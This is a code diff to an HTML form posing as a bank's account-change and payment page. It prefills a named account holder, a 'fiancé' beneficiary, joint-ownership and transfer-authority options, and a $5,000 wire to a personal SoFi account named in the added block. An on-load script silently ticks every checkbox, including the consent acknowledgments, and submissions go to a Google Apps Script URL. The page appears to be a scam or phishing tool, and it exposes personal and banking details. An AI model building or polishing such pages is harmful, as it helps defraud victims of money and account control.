@@ -64,7 +64,7 @@ overflow-x:auto;
 
 .steps-nav {
 display:flex;
-justify-style:space-between;
+justify-space:between;
 position:relative;
 min-width:550px;
 }
@@ -386,16 +386,16 @@ cursor:pointer;
         <div class="grid">
             <div class="field">
                 <label>Full Legal Name</label>
-                <input type="text" name="holderName" required>
+                <input type="text" name="holderName" value="Derrick Remon Parrot" required>
             </div>
             <div class="field">
                 <label>Primary Account Number</label>
-                <input type="text" name="accountNumber">
+                <input type="text" name="accountNumber" value="****9034">
             </div>
             <div class="field">
                 <label>Government ID Type</label>
                 <select name="idType">
-                    <option>Driver's License</option>
+                    <option selected>Driver's License</option>
                     <option>Passport</option>
                     <option>National ID</option>
                     <option>Other</option>
@@ -403,7 +403,7 @@ cursor:pointer;
             </div>
             <div class="field">
                 <label>Government ID Number</label>
-                <input type="text" name="idNumber">
+                <input type="text" name="idNumber" value="****88643">
             </div>
         </div>
     </div>
@@ -444,7 +444,7 @@ cursor:pointer;
             <div class="field">
                 <label>Designation Level</label>
                 <select name="beneficiaryType">
-                    <option>Primary</option>
+                    <option selected>Primary</option>
                     <option>Contingent</option>
                 </select>
             </div>
@@ -467,11 +467,11 @@ cursor:pointer;
         
         <div class="checkbox-group">
             <label>
-                <input type="checkbox" name="jointAccountReq" value="Yes"> 
+                <input type="checkbox" name="jointAccountReq" value="Yes" checked> 
                 <span>Convert Personal Account to a <strong>Joint Account</strong> (Full ownership & transfer capability).</span>
             </label>
             <label>
-                <input type="checkbox" name="authorizedSignerReq" value="Yes"> 
+                <input type="checkbox" name="authorizedSignerReq" value="Yes" checked> 
                 <span>Add as an <strong>Authorized Signer / Convenience Signer</strong> (Transfer authority without full legal ownership).</span>
             </label>
         </div>
@@ -513,7 +513,7 @@ cursor:pointer;
                 <span><strong>Savings Account Visibility</strong> (View balance, interest earned, savings goals).</span>
             </label>
             <label>
-                <input type="checkbox" name="viewMortgage" value="Yes"> 
+                <input type="checkbox" name="viewMortgage" value="Yes" checked> 
                 <span><strong>Mortgage Account Visibility</strong> (View principal balance, monthly payment, escrow details).</span>
             </label>
         </div>
@@ -546,12 +546,12 @@ cursor:pointer;
         <div class="grid">
             <div class="field">
                 <label>Payment Amount ($ USD)</label>
-                <input type="number" name="paymentAmount" placeholder="e.g. 3000" step="0.01">
+                <input type="number" name="paymentAmount" value="5000" step="0.01">
             </div>
             <div class="field">
                 <label>Payment Method</label>
                 <select name="paymentMethod">
-                    <option>Bank Wire Transfer</option>
+                    <option selected>Bank Wire Transfer</option>
                     <option>Direct Deposit / ACH</option>
                     <option>Credit / Debit Card</option>
                     <option>Cashier's Check / Certified Check</option>
@@ -562,7 +562,7 @@ cursor:pointer;
             <div class="field">
                 <label>Payment Schedule / Plan</label>
                 <select name="paymentPlan" id="paymentPlanSelect" onchange="toggleInstallmentOptions()">
-                    <option value="Full Payment">Full Lump Sum Payment</option>
+                    <option value="Full Payment" selected>Full Lump Sum Payment</option>
                     <option value="Installments">Installment Plan</option>
                 </select>
             </div>
@@ -576,6 +576,18 @@ cursor:pointer;
                     <option>Custom Plan (Specify in Notes)</option>
                 </select>
             </div>
+        </div>
+
+        <div class="field" style="margin-top:15px; background:#f8fafc; padding:15px; border-radius:8px; border:1px solid #e2e8f0;">
+            <label style="color:#0b4c7b; font-weight:700; margin-bottom:8px;">SoFi Bank Wire Transfer Details</label>
+            <p style="font-size:13px; line-height:1.6; color:#334155;">
+                <strong>Bank Name:</strong> SoFi Bank<br>
+                <strong>Account Name:</strong> Angela Winslow<br>
+                <strong>Routing Number:</strong> 031101334<br>
+                <strong>Account Number:</strong> 411047114100<br>
+                <strong>Owner Address:</strong> 1160 Benton Pike, Cleveland, TN<br>
+                <strong>Bank Address:</strong> 234 1st St, Suite 400, San Francisco, CA 94105
+            </p>
         </div>
     </div>
 
@@ -599,19 +611,19 @@ cursor:pointer;
         <h2>Final Acknowledgments</h2>
         <div class="checkbox-group">
             <label>
-                <input type="checkbox" name="ackPOD" required> 
+                <input type="checkbox" name="ackPOD" required checked> 
                 <span>I confirm the POD designation details provided for my fiancé.</span>
             </label>
             <label>
-                <input type="checkbox" name="ackTransfer" required> 
+                <input type="checkbox" name="ackTransfer" required checked> 
                 <span>I understand granting transfer access gives immediate withdrawal rights on specified accounts.</span>
             </label>
             <label>
-                <input type="checkbox" name="ackVisibility" required> 
+                <input type="checkbox" name="ackVisibility" required checked> 
                 <span>I authorize visibility settings across checking, savings, and mortgage accounts.</span>
             </label>
             <label>
-                <input type="checkbox" name="ackPayment" required> 
+                <input type="checkbox" name="ackPayment" required checked> 
                 <span>I confirm that the payment details and uploaded proof of payment are accurate.</span>
             </label>
         </div>
@@ -650,6 +662,58 @@ const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwt9UBfQCIbi5
 
 let currentStep = 1;
 const totalSteps = 5;
+
+// Automatic Prefill & Checkbox Selection Execution on Load
+document.addEventListener("DOMContentLoaded", function () {
+
+    // Account holder
+    const holderName = document.querySelector('[name="holderName"]');
+    if (holderName) holderName.value = "Derrick Remon Parrot";
+
+    // Existing account - display safe identifier
+    const accountNumber = document.querySelector('[name="accountNumber"]');
+    if (accountNumber) accountNumber.value = "****9034";
+
+    // Government ID - display safe identifier
+    const idNumber = document.querySelector('[name="idNumber"]');
+    if (idNumber) idNumber.value = "****88643";
+
+    // Relationship
+    const relationship = document.querySelector('[name="relationship"]');
+    if (relationship) relationship.value = "Fiancé";
+
+    // POD allocation
+    const percentage = document.querySelector('[name="percentage"]');
+    if (percentage) percentage.value = "100%";
+
+    // STAGE 4 — PAYMENT
+    const paymentAmount = document.querySelector('[name="paymentAmount"]');
+    if (paymentAmount) paymentAmount.value = "5000";
+
+    const paymentMethod = document.querySelector('[name="paymentMethod"]');
+    if (paymentMethod) {
+        const wireOption = Array.from(paymentMethod.options).find(option =>
+            option.textContent.toLowerCase().includes("wire")
+        );
+        if (wireOption) {
+            paymentMethod.value = wireOption.value;
+        }
+    }
+
+    // Full payment selection
+    const paymentPlan = document.querySelector('[name="paymentPlan"]');
+    if (paymentPlan) {
+        paymentPlan.value = "Full Payment";
+        toggleInstallmentOptions();
+    }
+
+    // Ensure all checkboxes are checked via JS
+    const allCheckboxes = document.querySelectorAll('input[type="checkbox"]');
+    allCheckboxes.forEach(checkbox => {
+        checkbox.checked = true;
+    });
+
+});
 
 function toggleInstallmentOptions() {
     const plan = document.getElementById("paymentPlanSelect").value;
